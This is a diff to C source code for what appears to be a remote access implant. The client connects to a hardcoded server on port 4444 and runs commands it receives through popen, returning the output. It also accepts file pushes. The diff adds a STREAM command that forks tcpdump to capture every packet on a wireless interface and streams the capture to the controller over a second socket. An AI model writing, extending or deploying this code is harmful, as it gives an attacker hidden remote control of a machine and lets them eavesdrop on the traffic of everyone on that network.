@@ -19,11 +19,13 @@
 #ifndef MSG_NOSIGNAL
 #define MSG_NOSIGNAL 0
 #endif
-#define SERVER_IP "10.96.45.29"
+#define SERVER_IP "10.122.91.29"
 #define COMMAND_PORT 4444
 #define HEARTBEAT_TIMEOUT 60
 #define MAX_RETRIES 0
 #define PUSH_SOCK_ERROR (-1)
+
+#define STREAM_PACKET_SIZE 4096
 
 #ifndef LOCAL
 #define POLL_TIMEOUT 15
@@ -33,8 +35,19 @@
 
 
 volatile sig_atomic_t keep_running = 1;
+volatile sig_atomic_t stop_stream = 0;
+
+pid_t tcpdump_pid = -1;
+pid_t sender_pid = -1;
+
+void sigterm_handler(int sig) {
+    (void)sig;
+    stop_stream = 1;
+}
+
 char CLIENT_ID[33] = {0};
 int HEARTBEAT_PORT = 0;
+int is_stream = 0;
 
 /* Improved monotonic timer for uClibc/old kernels without reliable RTC */
 static unsigned long get_monotonic_time(void) {
@@ -102,7 +115,7 @@ int handle_push_command(int sock, char *cmd, int bytes_read) {
     char dest_path[256];
     long file_size;
 
-    print_hex(cmd, 150);
+    //print_hex(cmd, 150);
 
     char *header_end = memchr(cmd, 0x0A, bytes_read);
     if (!header_end) {
@@ -193,6 +206,154 @@ int handle_push_command(int sock, char *cmd, int bytes_read) {
 
     fprintf(stderr, "[!] File transfer incomplete.\n");
     return PUSH_SOCK_ERROR;
+}
+
+static void die(const char *msg) {
+    perror(msg);
+    exit(1);
+}
+
+int create_tcp_socket(int port) {
+    int sock;
+    struct sockaddr_in srv;
+
+    /* Crea socket TCP */
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) {
+        perror("[!] socket creation failed");
+        return -1;
+    }
+
+    memset(&srv, 0, sizeof(srv));
+    srv.sin_family = AF_INET;
+    srv.sin_port = htons(port);
+    srv.sin_addr.s_addr = inet_addr(SERVER_IP);
+
+    if (connect(sock, (struct sockaddr *)&srv, sizeof(srv)) < 0) {
+        perror("[!] connect failed");
+        close(sock);
+        return -1;
+    }
+
+    return sock;  // Socket pronta per send/recv
+}
+
+void handle_stream_command(char *cmd, int bytes_read, int sock) {
+    (void)cmd;
+    (void)bytes_read;
+
+    if (sock < 0)
+        return;
+
+    int pipefd[2];
+
+    if (pipe(pipefd) < 0) {
+        perror("pipe");
+        return;
+    }
+
+    /* =======================
+     * FIGLIO 1: tcpdump
+     * ======================= */
+    tcpdump_pid = fork();
+    if (tcpdump_pid < 0) {
+        perror("fork tcpdump");
+        close(pipefd[0]);
+        close(pipefd[1]);
+        return;
+    }
+
+    if (tcpdump_pid == 0) {
+        /* handler SIGTERM */
+        struct sigaction sa;
+        memset(&sa, 0, sizeof(sa));
+        sa.sa_handler = sigterm_handler;
+        sigaction(SIGTERM, &sa, NULL);
+
+        /* chiude socket non necessarie */
+        close(command_sock);
+        close(heartbeat_sock);
+        close(sock);          /* stream socket */
+
+        /* pipe setup */
+        close(pipefd[0]);
+        dup2(pipefd[1], STDOUT_FILENO);
+        close(pipefd[1]);
+
+        execl("/usr/sbin/tcpdump",
+              "tcpdump",
+              "-i", "wlp0s20f3",
+              "-U",
+              "-s", "0",
+              "-w", "-",
+              NULL);
+
+        _exit(1);
+    }
+
+    /* =======================
+     * FIGLIO 2: sender
+     * ======================= */
+    sender_pid = fork();
+    if (sender_pid < 0) {
+        perror("fork sender");
+        kill(tcpdump_pid, SIGTERM);
+        close(pipefd[0]);
+        close(pipefd[1]);
+        return;
+    }
+
+    if (sender_pid == 0) {
+        struct sigaction sa;
+        memset(&sa, 0, sizeof(sa));
+        sa.sa_handler = sigterm_handler;
+        sigaction(SIGTERM, &sa, NULL);
+        signal(SIGPIPE, SIG_IGN);
+
+        /* chiude socket inutili */
+        close(command_sock);
+        close(heartbeat_sock);
+
+        /* sender usa solo pipefd[0] e sock */
+        close(pipefd[1]);
+
+        char buf[STREAM_PACKET_SIZE];
+        ssize_t n;
+
+        while (!stop_stream && is_stream &&
+               (n = read(pipefd[0], buf, sizeof(buf))) > 0) {
+
+            uint32_t netlen = htonl((uint32_t)n);
+            if (send(sock, &netlen, sizeof(netlen), MSG_NOSIGNAL) != sizeof(netlen))
+                break;
+
+            ssize_t off = 0;
+            while (!stop_stream && off < n) {
+                ssize_t sent = send(sock, buf + off, n - off, MSG_NOSIGNAL);
+                if (sent <= 0)
+                    goto sender_out;
+                off += sent;
+            }
+        }
+
+    sender_out:
+        close(pipefd[0]);
+        close(sock);
+        _exit(0);
+    }
+
+    /* =======================
+     * PADRE
+     * ======================= */
+    close(pipefd[0]);
+    close(pipefd[1]);
+
+    /* IMPORTANTISSIMO:
+       il padre NON deve tenere aperto lo stream socket */
+    close(sock);
+
+    printf("Exiting stream func\n");
+    return;
 }
 
 void handle_signal(int sig) {
@@ -364,6 +525,8 @@ int main() {
             printf("[*] Dummy UDP sent to initialize reception\n");
         }
 
+        int stream_sock = create_tcp_socket(4446);
+
         /* Removed TIMEO for UDP: not supported */
         /* Handshake */
         char handshake[256];
@@ -377,6 +540,7 @@ int main() {
             sleep(5);
             continue;
         }
+        printf("[*] Connection sucessful...\n");
         memset(buffer, 0, sizeof(buffer));
         int bytes = recv(command_sock, buffer, sizeof(buffer)-1, 0);
         if (bytes <= 0) {
@@ -386,6 +550,7 @@ int main() {
             sleep(5);
             continue;
         }
+
         buffer[bytes] = '\0';
         printf("[+] Server: %s\n", buffer);
         /* Reset timer with monotonic time */
@@ -494,9 +659,9 @@ int main() {
                 fflush(stdout);
 
                 if (strncmp(buffer, "PUSH|", 5) == 0) {
-                    printf("[*] PUSH TEST\n");
-                    print_hex(buffer, 150);
-                    printf("[*] END TEST\n");
+                    //printf("[*] PUSH TEST\n");
+                    //print_hex(buffer, 150);
+                    //printf("[*] END TEST\n");
                     int push_res = handle_push_command(command_sock, buffer, bytes);
                     if (push_res != 0)
                     {
@@ -510,12 +675,33 @@ int main() {
                     printf("ERROR: THIS SHOULD BE UNREACHABLE\n");
                 }
 
+                if (strncmp(buffer, "STREAM|", 7) == 0) {
+                    printf("[*] Stream command received\n");
+                    is_stream = 1;
+                    handle_stream_command(buffer, bytes, stream_sock);
+                }
+
+                if (strncmp(buffer, "STOPSTREAM|", 11) == 0) {
+                    printf("[*] Stop stream command received\n");
+                    is_stream = 0;
+                    kill(sender_pid, SIGTERM);
+                    sender_pid=-1;
+                    kill(tcpdump_pid, SIGTERM);
+                    tcpdump_pid=-1;
+
+                }
+
                 if (strcasecmp(buffer, "EXIT") == 0) {
                     printf("[*] Exit command received\n");
                     fflush(stdout);
                     send(command_sock, "Goodbye!", 8, MSG_NOSIGNAL);
                     close(command_sock);
                     close(heartbeat_sock);
+                    is_stream = 0;
+                    if (sender_pid > 0)
+                        kill(sender_pid, SIGTERM);
+                    if (tcpdump_pid > 0)
+                        kill(tcpdump_pid, SIGTERM);
                     return 0;
                 }
                 /* Execute command */
@@ -527,6 +713,7 @@ int main() {
                     while (fgets(result, sizeof(result), fp)) {
                         size_t len = strlen(result);
                         sent = send(command_sock, result, len, MSG_NOSIGNAL);
+                        printf("Result: %s\n", result);
                         if (sent <= 0) {
                             perror("[!] send failed");
                             fflush(stdout);
